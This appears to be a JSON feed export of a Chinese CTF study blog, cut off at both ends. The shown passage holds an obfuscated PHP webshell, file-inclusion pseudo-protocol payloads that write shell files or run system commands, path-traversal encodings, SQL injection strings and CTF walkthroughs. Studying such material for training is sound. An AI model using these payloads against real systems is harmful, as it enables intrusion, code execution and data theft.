class=\"variable\">$___</span> .= <span class=\"variable\">$__</span>;   <span class=\"comment\">//$___=&quot;ASSERT&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span> = <span class=\"variable\">$_</span>;   <span class=\"comment\">//$__=&quot;A&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$____</span> = <span class=\"string\">&quot;_&quot;</span>;   <span class=\"comment\">//$____=&quot;_&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;   <span class=\"comment\">//得到&quot;P&quot;，此时$__=&quot;P&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$____</span> .= <span class=\"variable\">$__</span>;   <span class=\"comment\">//$____=&quot;_P&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span> = <span class=\"variable\">$_</span>;   <span class=\"comment\">//$__=&quot;A&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;   <span class=\"comment\">//得到&quot;O&quot;，此时$__=&quot;O&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$____</span> .= <span class=\"variable\">$__</span>;   <span class=\"comment\">//$____=&quot;_PO&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;   <span class=\"comment\">//得到&quot;S&quot;，此时$__=&quot;S&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$____</span> .= <span class=\"variable\">$__</span>;   <span class=\"comment\">//$____=&quot;_POS&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>++;   <span class=\"comment\">//得到&quot;T&quot;，此时$__=&quot;T&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$____</span> .= <span class=\"variable\">$__</span>;   <span class=\"comment\">//$____=&quot;_POST&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$_</span> = <span class=\"variable\">$$____</span>;   <span class=\"comment\">//$_=$_POST</span></span><br><span class=\"line\"><span class=\"variable\">$___</span>(<span class=\"variable\">$_</span>[_]);   <span class=\"comment\">//ASSERT($POST[_])</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"2\"><a class=\"markdownIt-Anchor\" href=\"#2\">#</a> 2.</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$_</span>=[];</span><br><span class=\"line\"><span class=\"variable\">$_</span>=@<span class=\"string\">&quot;<span class=\"subst\">$_</span>&quot;</span>; <span class=\"comment\">// $_=&#x27;Array&#x27;;</span></span><br><span class=\"line\"><span class=\"variable\">$_</span>=<span class=\"variable\">$_</span>[<span class=\"string\">&#x27;!&#x27;</span>==<span class=\"string\">&#x27;@&#x27;</span>]; <span class=\"comment\">// $_=$_[0];</span></span><br><span class=\"line\"><span class=\"variable\">$___</span>=<span class=\"variable\">$_</span>; <span class=\"comment\">// A</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>=<span class=\"variable\">$_</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;</span><br><span class=\"line\"><span class=\"variable\">$___</span>.=<span class=\"variable\">$__</span>; <span class=\"comment\">// S</span></span><br><span class=\"line\"><span class=\"variable\">$___</span>.=<span class=\"variable\">$__</span>; <span class=\"comment\">// S</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>=<span class=\"variable\">$_</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++; <span class=\"comment\">// E </span></span><br><span class=\"line\"><span class=\"variable\">$___</span>.=<span class=\"variable\">$__</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>=<span class=\"variable\">$_</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++; <span class=\"comment\">// R</span></span><br><span class=\"line\"><span class=\"variable\">$___</span>.=<span class=\"variable\">$__</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>=<span class=\"variable\">$_</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++; <span class=\"comment\">// T</span></span><br><span class=\"line\"><span class=\"variable\">$___</span>.=<span class=\"variable\">$__</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$____</span>=<span class=\"string\">&#x27;_&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>=<span class=\"variable\">$_</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++; <span class=\"comment\">// P</span></span><br><span class=\"line\"><span class=\"variable\">$____</span>.=<span class=\"variable\">$__</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>=<span class=\"variable\">$_</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++; <span class=\"comment\">// O</span></span><br><span class=\"line\"><span class=\"variable\">$____</span>.=<span class=\"variable\">$__</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>=<span class=\"variable\">$_</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++; <span class=\"comment\">// S</span></span><br><span class=\"line\"><span class=\"variable\">$____</span>.=<span class=\"variable\">$__</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>=<span class=\"variable\">$_</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++; <span class=\"comment\">// T</span></span><br><span class=\"line\"><span class=\"variable\">$____</span>.=<span class=\"variable\">$__</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$_</span>=<span class=\"variable\">$$____</span>;</span><br><span class=\"line\"><span class=\"variable\">$___</span>(<span class=\"variable\">$_</span>[_]); <span class=\"comment\">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure>\n<p><mark>注意</mark><br>\n由于有很多不可见字符，我们要把它们放到一排后 url 编码才能用</p>\n<h1 id=\"php5与php7的区别\"><a class=\"markdownIt-Anchor\" href=\"#php5与php7的区别\">#</a> php5 与 php7 的区别</h1>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php5:</span><br><span class=\"line\">$f=&#x27;assert&#x27;;$f($_POST[1]);</span><br><span class=\"line\">post: 1=phpinfo();</span><br><span class=\"line\"></span><br><span class=\"line\">php7:</span><br><span class=\"line\">($f)()方法调用函数</span><br><span class=\"line\">eg.</span><br><span class=\"line\">(call_user_func)(system,whoami,&#x27;&#x27;)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>因此 php7 可以取反直接用，就像上面第一个方法一样</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(call_user_func)(system,whoami,&#x27;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">(~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c)(~%8c%86%8c%8b%9a%92,~%88%97%90%9e%92%96,&#x27;&#x27;);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "url": "https://hq185187.github.io/2023/04/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "title": "文件包含及伪协议的使用",
            "date_published": "2023-04-26T10:30:05.193Z",
            "content_html": "<h1 id=\"原因\"><a class=\"markdownIt-Anchor\" href=\"#原因\">#</a> 原因</h1>\n<p>四个函数:include (),include_once (),require (),require_once ()<br>\n 只要文件内容符合 PHP 语法规范，那么任何扩展名都可以被 PHP 解析。比如把 <code>&lt;?php phpinfo();?&gt;</code>  文件名改为 phpinfo.txt 还是可以看到信息<br>\n包含非 PHP 语法规范源文件时，将会暴露其源代码</p>\n<h1 id=\"伪协议\"><a class=\"markdownIt-Anchor\" href=\"#伪协议\">#</a> 伪协议</h1>\n<h2 id=\"1data协议\"><a class=\"markdownIt-Anchor\" href=\"#1data协议\">#</a> 1.data 协议</h2>\n<p>这是一种数据流封装器，用法: <code>data://text/plain,&lt;?php system('whoami')?&gt;</code> <br>\n <code>data://text/plain;base64,PD9waHAgc3lzdGVtKHdob2FtaSk/Pg==</code></p>\n<h2 id=\"2php协议\"><a class=\"markdownIt-Anchor\" href=\"#2php协议\">#</a> 2.php:// 协议</h2>\n<p>访问各个输入输出流</p>\n<h3 id=\"1phpinput\"><a class=\"markdownIt-Anchor\" href=\"#1phpinput\">#</a> (1)php://input</h3>\n<p>用来接收 POST 数据<br>\n eg1. 增加一句话</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php:input</span><br><span class=\"line\">post传参:</span><br><span class=\"line\">&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;a&quot;),&quot;&lt;?php phpinfo.php();?&gt;&quot;)?&gt;</span><br></pre></td></tr></table></figure>\n<p>eg2. 增加文件<br>\n post 部分改为:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php phpinfo.php();?&gt;&quot;)?&gt;</span><br></pre></td></tr></table></figure>\n<p>eg3. 执行系统命令<br>\n post 为:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2phpfilter\"><a class=\"markdownIt-Anchor\" href=\"#2phpfilter\">#</a> (2)php://filter</h2>\n<p>这个语句用来查看源码。直接包含 php 文件时会被解析，不能看到源码，所以用 filter 来读取，不过要先 base64 加密传输过来<br>\n eg.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php://filter/read=convert.base64-encode/resource=C:\\oneword</span><br></pre></td></tr></table></figure>\n<p>还有一些可参考 php 手册</p>\n<h2 id=\"3file协议\"><a class=\"markdownIt-Anchor\" href=\"#3file协议\">#</a> 3.file:// 协议</h2>\n<p>访问本地文件系统<br>\n eg</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file:///D:/phpstudy_pro/WWW/index.html</span><br><span class=\"line\"></span><br><span class=\"line\">file://D:\\phpstudy_pro\\WWW\\index.html</span><br></pre></td></tr></table></figure>\n<p>看个例子:</p>\n<p>![[Pasted image 20230425131935.png]]<br>\n![[Pasted image 20230425132653.png]]<br>\n 前面说过后缀名不是 php 但是文件内容符合 php 结构的也可以当作 php 解析，这就是 include 函数</p>\n<h2 id=\"4zip协议\"><a class=\"markdownIt-Anchor\" href=\"#4zip协议\">#</a> 4.zip 协议</h2>\n<p>zip:// 本来是用来访问压缩包里的文件。当它与包含函数结合时，zip:// 流就会被当作 php 文件执行</p>\n<p>规则:</p>\n<ol>\n<li>zip:// 中只能传入绝对路径</li>\n<li>要用 #分隔压缩包和压缩包里的内容，并且 #要用 url 编码 %23</li>\n<li>只需要是 zip 的压缩包就行，后缀名可以任意改<br>\n eg 直接用 zip 协议</li>\n</ol>\n<p>![[Pasted image 20230425141324.png]]</p>\n<p>改成 zip.jpg 后<br>\n！[[Pasted image 20230425141432.png]]</p>\n<ul>\n<li>bzip2,zlib 一样就是绝对路径和相对路径都能用</li>\n</ul>\n<h2 id=\"5phar协议\"><a class=\"markdownIt-Anchor\" href=\"#5phar协议\">#</a> 5.phar 协议</h2>\n<ul>\n<li>phar:// 有点类似 zip:// 同样可以导致 任意代码执行。</li>\n<li>可以用相对路径和绝对路径<br>\n poc:</li>\n<li><code>?file=phar://zip.jpg/phpinfo.txt</code></li>\n<li><code>?file=phar://D:\\zip.jpg\\phpinfo.txt</code></li>\n<li>可以配合文件上传漏洞:<br>\n 假如文件上传限制 MIME, 把木马文件压缩成 zip, 再该后缀名为 jpg, 直接 phar 协议执行</li>\n</ul>\n<h1 id=\"绕过\"><a class=\"markdownIt-Anchor\" href=\"#绕过\">#</a> 绕过</h1>\n<h2 id=\"1指定后缀名\"><a class=\"markdownIt-Anchor\" href=\"#1指定后缀名\">#</a> 1. 指定后缀名</h2>\n<p>eg</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">\terror_reporting(0);</span><br><span class=\"line\">\t$file = $_GET[&quot;file&quot;];</span><br><span class=\"line\">\t//后缀</span><br><span class=\"line\">\tinclude $file.&quot;.txt&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">\thighlight_file(__FILE__);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<ol>\n<li>%00 截断</li>\n<li>长度绕过，一直././././././././,Windows 超过 256 后面丢弃，Linux4096</li>\n<li>url 绕过:<br>\n <code>url:protocol :// hostname[:port] / path / [;parameters][?query]#fragment </code> <br>\n(1).query<br>\npayload: <code>http://127.0.0.1/phpinfo.php?</code> <br>\n 拼接后: <code>http://127.0.0.1/phpinfo.php?.txt</code> <br>\n(2)fragment<br>\npayload: <code>http://127.0.0.1/phpinfo.php%23</code> <br>\n 拼接后: <code>http://127.0.0.1/phpinfo.php#.txt</code></li>\n</ol>\n<h2 id=\"2编码\"><a class=\"markdownIt-Anchor\" href=\"#2编码\">#</a> 2. 编码</h2>\n<h3 id=\"1\"><a class=\"markdownIt-Anchor\" href=\"#1\">#</a> 1.  …/</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.url编码</span><br><span class=\"line\">%2e%2e%2f</span><br><span class=\"line\">..%2f</span><br><span class=\"line\">%2e%2e/</span><br><span class=\"line\">2.二次编码</span><br><span class=\"line\">%252e%252e%252f</span><br><span class=\"line\">3.容器和服务器编码</span><br><span class=\"line\">..%c0%af</span><br></pre></td></tr></table></figure>\n<p>参考:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4L2FydGljbGUvZGV0YWlscy84NzA5MDUzOQ==\">(122 条消息) CTF 中文件包含漏洞总结_LetheSec 的博客 - CSDN 博客</span></p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/26/nessctf/",
            "url": "https://hq185187.github.io/2023/04/26/nessctf/",
            "title": "NSSCTF精选",
            "date_published": "2023-04-25T16:51:04.501Z",
            "content_html": "<h3 id=\"1easy_md5\"><a class=\"markdownIt-Anchor\" href=\"#1easy_md5\">#</a> 1.easy_md5</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`&lt;?php     highlight_file(__FILE__);    include &#x27;flag2.php&#x27;;       if (isset($_GET[&#x27;name&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;]))&#123;    $name = $_GET[&#x27;name&#x27;];    $password = $_POST[&#x27;password&#x27;];       if ($name != $password &amp;&amp; md5($name) == md5($password))&#123;           echo $flag;       &#125;       else &#123;           echo &quot;wrong!&quot;;       &#125;       &#125;   else &#123;       echo &#x27;wrong!&#x27;;   &#125;   ?&gt;`</span><br></pre></td></tr></table></figure>\n<p>md5 弱类型比较<br>\n (1).0e 绕过<br>\n以下是一些字符串 md5 值以 0e 开头<br>\n QNKCDZO<br>\n240610708<br>\ns878926199a<br>\ns155964671a<br>\ns21587387a</p>\n<p>(2). 数组绕过<br>\n md5 () 函数计算的是一个字符串的哈希值，对于数组则返回 false<br>\n <code>payload:?a[]=1&amp;b[]=2</code></p>\n<h3 id=\"2caidao\"><a class=\"markdownIt-Anchor\" href=\"#2caidao\">#</a> 2.caidao</h3>\n<p>(1) antsword 连<br>\n (2) hackbar 传参:`wllm=system (‘cat …/…/…/flag’);</p>\n<h3 id=\"3include\"><a class=\"markdownIt-Anchor\" href=\"#3include\">#</a> 3.include</h3>\n<p>(1) filter 伪协议</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<p>这题用 file 协议也可以但是没有得到 flag<br>\n 可以这样:?file= <code>file:///etc/passwd</code> <br>\n 但是 <code>?file=file:///var/www/flag.php</code>  不行<br>\n<strong>想深刻了解伪协议的来这里:</strong><a href=\"https://hq185187.github.io/2023/04/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/\">看看文件包含叭</a></p>\n<h3 id=\"4ezrce\"><a class=\"markdownIt-Anchor\" href=\"#4ezrce\">#</a> 4.ezrce</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`&lt;?php   error_reporting(0);   highlight_file(__FILE__);   if(isset($_GET[&#x27;url&#x27;]))   &#123;   eval($_GET[&#x27;url&#x27;]);   &#125;`</span><br></pre></td></tr></table></figure>\n<p>学习 Linux 命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls / 列出根目录(\\)下的所有目录</span><br><span class=\"line\">发现flag文件在root根目录下,cat /flllllllag来cat根目录下的flag文件</span><br></pre></td></tr></table></figure>\n<p><strong>深刻了解 Linux 命令来这里</strong></p>\n<h3 id=\"5easysql-suctf2019\"><a class=\"markdownIt-Anchor\" href=\"#5easysql-suctf2019\">#</a> 5.EasySQL SUCTF2019</h3>\n<p>fuzz:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; or 1=1--+</span><br><span class=\"line\">1&#x27; order by 3--+</span><br><span class=\"line\">1&#x27; and updatexml(1,concat(0x7e,database()),1)--+</span><br><span class=\"line\">1&#x27; and if(length(database())&gt;1,sleep(5),1)--+</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>堆叠注入:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1;show databases#</span><br><span class=\"line\">1;show tables#</span><br><span class=\"line\">这两个还可以</span><br><span class=\"line\">1;show columns from &#x27;Flag&#x27;#</span><br><span class=\"line\">失败</span><br></pre></td></tr></table></figure>\n<p>它的 SQL 查询语句是:<br>\n <code>select $_POST['query']||flag from Flag</code> <br>\n 说真的我猜不出来<br>\n当 sql_mode 设置了 PIPES_AS_CONCAT 时，|| 是字符串连接符，相当于 concat () 函数</p>\n<p><code>payload1:*,1</code> <br>\nsql: <code>select *,1||flag from Flag</code> , 这样查询出了 Flag 表的所有内容<br>\n此处的 1 是临时增加一列，列名为 1||flag 且这一列的所有值都为 1</p>\n<p>payload2: <code>1;set sql_mode=PIPES_AS_CONCAT;select 1 sql:</code> select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag</p>\n<p>返回一个列名为 1||flag, 列元素为 1flag 的值的表</p>\n<h3 id=\"6zjctf-2019nizhuansiwei\"><a class=\"markdownIt-Anchor\" href=\"#6zjctf-2019nizhuansiwei\">#</a> 6.[ZJCTF 2019]NiZhuanSiWei</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">$text = $_GET[&quot;text&quot;];</span><br><span class=\"line\">$file = $_GET[&quot;file&quot;];</span><br><span class=\"line\">$password = $_GET[&quot;password&quot;];</span><br><span class=\"line\">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class=\"line\">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class=\"line\">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class=\"line\">        echo &quot;Not now!&quot;;</span><br><span class=\"line\">        exit(); </span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        include($file);  //useless.php</span><br><span class=\"line\">        $password = unserialize($password);</span><br><span class=\"line\">        echo $password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>第一步：绕过 file_get_contents<br>\n(1)php://input<br>\n?text=php://input<br>\npost 传参: <code>welcome to the zjctf</code> <br>\n (2) data 协议<br>\n <code>?text=data://text/plain,welcome to the zjctf</code> <br>\n 根据提示的 useless.php 可以发现可以用伪协议读取<br>\n <code>file=php://filter/read=convert.base64-encode/resource=useless.php</code> <br>\n 第一步:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?text=file=php://input&amp;&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br><span class=\"line\"></span><br><span class=\"line\">post传参:welcome to the zjct</span><br></pre></td></tr></table></figure>\n<p>经过 base64 解码得到 useless.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span 